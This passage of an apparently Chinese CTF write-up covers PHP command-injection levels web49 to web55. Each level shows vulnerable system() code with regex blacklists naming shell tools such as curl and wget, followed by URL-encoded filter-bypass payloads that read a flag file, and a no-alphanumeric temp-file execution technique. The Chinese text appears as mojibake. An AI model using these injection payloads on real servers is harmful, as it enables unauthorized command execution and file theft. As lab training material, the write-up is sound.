</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:22:43
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%</p></blockquote>
<p>è™½ç„¶è¿‡æ»¤äº†%ä½†æ˜¯æ˜¯ä¸å½±å“æˆ‘ä»¬ä¼ å…¥çš„urlç¼–ç çš„</p>
<pre tabindex="0"><code>tac%09fl??.php%0a

or

tac%09fl??.php%7c%7c 
</code></pre><h4 id="web50">web50<a hidden class="anchor" aria-hidden="true" href="#web50">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:32:47
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%|\x09|\x26</p></blockquote>
<p>åï¼Œæ²¡æ³•ç”¨%09ä»£æ›¿ç©ºæ ¼ï¼Œæ²¡æ³•ç”¨?ä»£æ›¿å­—ç¬¦</p>
<p>ä¸è¿‡å¹¸å¥½è¿˜æœ‰&lt;å’Œ&rsquo;'</p>
<pre tabindex="0"><code>tac&lt;fla%27%27g.php||
or
tac&lt;fla%27%27g.php%0a
</code></pre><h4 id="web51">web51<a hidden class="anchor" aria-hidden="true" href="#web51">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:42:52
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|</span><span class="se">\\</span><span class="s2">$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|\$|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26/</p></blockquote>
<p>æ€ä¹ˆæŠŠæˆ‘tacä¹Ÿè¿‡æ»¤äº†</p>
<p>æ²¡äº‹èƒ½ç»•è¿‡</p>
<pre tabindex="0"><code>t%27%27ac&lt;fla%27%27g.php||
or
t%27%27ac&lt;fla%27%27g.php%0a
</code></pre><h4 id="web51-1">web51<a hidden class="anchor" aria-hidden="true" href="#web51-1">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-05 22:50:30
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34; &gt;/dev/null 2&gt;&amp;1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;</p></blockquote>
<p>æˆ‘æµ‹æ€ä¹ˆè¿&lt; &gt;éƒ½è¦è¿‡æ»¤</p>
<p>åˆ«å¿˜äº†è¿˜å¯ä»¥ç”¨$IFS</p>
<pre tabindex="0"><code>ca%27%27t$IFS/fla%27%27g||
or
ca%27%27t$IFS/fla%27%27g%0a
</code></pre><h4 id="web52">web52<a hidden class="anchor" aria-hidden="true" href="#web52">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 18:21:02
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">echo</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="nv">$d</span> <span class="o">=</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="o">.</span><span class="nv">$d</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;no&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<blockquote>
<p>;|cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;/</p></blockquote>
<p>è¿™é¢˜æ²¡æœ‰åœ¨åé¢è¿›è¡Œå‘½ä»¤æ‹¼æ¥ï¼Œå…¶ä»–å’Œä¸Šä¸€é¢˜ä¸€æ ·</p>
<pre tabindex="0"><code>c%27%27at${IFS}fla%27%27g.php
</code></pre><h4 id="web54">web54<a hidden class="anchor" aria-hidden="true" href="#web54">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 19:43:42
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿™é¢˜è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤,é¢˜ç›®é€šè¿‡*ä½¿å¾—åªè¦æ˜¯ä¼ å…¥çš„å†…å®¹å‡ºç°å¦‚catä¸‰ä¸ªå­—ç¬¦å³å¯è¢«åŒ¹é…åˆ°ï¼Œæ— æ³•ä½¿ç”¨ä¹‹å‰çš„å­—ç¬¦æ‹¼æ¥æ–¹æ³•ç»•è¿‡</p>
<p>è¿™é¢˜æ²¡è¿‡ç‡é€šé…ç¬¦?</p>
<p>è§£ä¸€</p>
<pre tabindex="0"><code>/bin/?at${IFS}f???????
</code></pre><p>catå‘½ä»¤æ‰€åœ¨çš„è·¯å¾„æ˜¯åœ¨/bin/ç›®å½•ä¸‹ï¼Œæ‰€ä»¥è¿™é‡Œç›¸å½“äºç›´æ¥è°ƒç”¨äº†catæ–‡ä»¶æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œçš„catå¯ä»¥çœ‹ä½œå‘½ä»¤ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥é€šé…ç¬¦å¯ä»¥ç”¨åœ¨è¿™ä¸Šé¢ï¼ˆä¸€å¼€å§‹è¿˜å‚»å‚»çš„æ¢æˆuniqçœ‹èƒ½ä¸èƒ½ç”¨hhhï¼‰ã€‚</p>
<p>binä¸‹çš„å‘½ä»¤ï¼š<a href="https://www.cnblogs.com/cuiqi1314/articles/7339776.html">Linux /bin ç›®å½•ä¸‹å‘½ä»¤ç®€è¦è¯´æ˜ - å´”æ—— - åšå®¢å›­</a></p>
<p>åŒç†binç›®å½•ä¸‹è¿˜å­˜åœ¨moreï¼Œæ‰€ä»¥è¿™é‡Œçš„catæˆ‘ä»¬æ¢æˆmoreä¹Ÿå¯ä»¥è¯»å–flagã€‚
è§£äºŒ</p>
<pre tabindex="0"><code>vi${IFS}fla?.php 
or
c=uniq${IFS}f???.php //å€’åºçš„
or
grep${IFS}%27fla%27${IFS}f???????%0a
</code></pre><h4 id="web55">web55<a hidden class="anchor" aria-hidden="true" href="#web55">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 20:03:51
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="c1">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è¿‡æ»¤äº†</p>
<pre tabindex="0"><code>\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/
</code></pre><p>è¿™é¢˜æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹</p>
<p>ä¹Ÿå°±æ˜¯<strong>æ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œ</strong></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108557067">https://blog.csdn.net/qq_46091464/article/details/108557067</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡ | ç¦»åˆ«æ­Œ</a></p>
<p>æ€è·¯</p>
<blockquote>
<ol>
<li>shellä¸‹å¯ä»¥åˆ©ç”¨<code>.</code>æ¥æ‰§è¡Œä»»æ„è„šæœ¬</li>
<li>Linuxæ–‡ä»¶åæ”¯æŒç”¨globé€šé…ç¬¦ä»£æ›¿</li>
</ol></blockquote>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡postä¸€ä¸ªæ–‡ä»¶(æ–‡ä»¶é‡Œé¢çš„shå‘½ä»¤)ï¼Œåœ¨ä¸Šä¼ çš„è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡<code>.(ç‚¹)</code>å»æ‰§è¡Œæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚(å½¢æˆäº†æ¡ä»¶ç«äº‰)ã€‚ä¸€èˆ¬æ¥è¯´è¿™ä¸ªæ–‡ä»¶åœ¨linuxä¸‹é¢ä¿å­˜åœ¨<code>/tmp/php??????</code>ä¸€èˆ¬åé¢çš„6ä¸ªå­—ç¬¦æ˜¯éšæœºç”Ÿæˆçš„æœ‰å¤§å°å†™ã€‚ï¼ˆå¯ä»¥é€šè¿‡linuxçš„åŒ¹é…ç¬¦å»åŒ¹é…ï¼‰</p>
<blockquote>
<pre tabindex="0"><code>æ³¨æ„ï¼šé€šè¿‡`.`å»æ‰§è¡Œshå‘½ä»¤ä¸éœ€è¦æœ‰æ‰§è¡Œæƒé™
</code></pre></blockquote>
<p>1.æ„é€ postæ•°æ®åŒ…</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>POSTæ•°æ®åŒ…POC<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
